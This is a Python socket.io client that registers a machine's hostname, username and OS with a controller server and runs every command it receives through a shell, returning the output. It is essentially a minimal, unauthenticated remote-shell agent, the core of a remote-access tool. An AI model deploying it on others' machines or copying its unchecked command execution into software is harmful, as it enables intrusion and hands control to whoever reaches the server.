import socketio
import subprocess
import socket
import platform
import getpass

DEVICE_ID = "PC-001"

sio = socketio.Client()


@sio.event
def connect():
    print("----------CONNECTED TO SERVER----------")
    
    metadata = {
        "device_id": DEVICE_ID,
        "hostname": socket.gethostname(),
        "username" : getpass.getuser(),
        "os": platform.system(),
    }

    sio.emit(
        "register_agent",  metadata
    )


@sio.event
def registration_success(data):
    print("----------REGISTERED----------", data)


@sio.event
def run_command(data):
    command = data["command"]
    controller_sid = data["controller_sid"]

    print("----------COMMAND----------", command)

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True
        )

        output = result.stdout

        if result.stderr:
            output += "\n" + result.stderr

        sio.emit(
            "command_result",
            {
                "controller_sid": controller_sid,
                "status": "success",
                "output": output
            }
        )

    except Exception as e:
        sio.emit(
            "command_result",
            {
                "controller_sid": controller_sid,
                "status": "error",
                "output": str(e)
            }
        )


@sio.event
def disconnect():
    print("----------DISCONNECTED----------")


sio.connect("http://localhost:5000")
sio.wait()